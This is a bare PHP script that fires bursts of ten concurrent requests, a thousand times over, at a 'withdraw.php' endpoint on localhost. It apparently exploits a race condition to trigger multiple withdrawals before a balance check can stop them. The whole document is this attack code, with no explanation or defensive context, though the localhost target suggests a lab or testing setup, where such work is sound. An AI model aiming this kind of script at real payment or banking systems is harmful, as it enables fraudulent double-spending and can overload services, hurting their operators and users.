<?php
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "http://localhost/withdraw.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

for ($i = 0; $i < 1000; $i++) {
    $mh = curl_multi_init();
    $handles = [];

    for ($j = 0; $j < 10; $j++) {
        $handles[$j] = curl_copy_handle($ch);
        curl_multi_add_handle($mh, $handles[$j]);
    }

    do {
        $status = curl_multi_exec($mh, $active);
        if ($active) {
            curl_multi_select($mh);
        }
    } while ($active && $status == CURLM_OK);

    foreach ($handles as $handle) {
        curl_multi_remove_handle($mh, $handle);
        curl_close($handle);
    }

    curl_multi_close($mh);
}
curl_close($ch);
?>
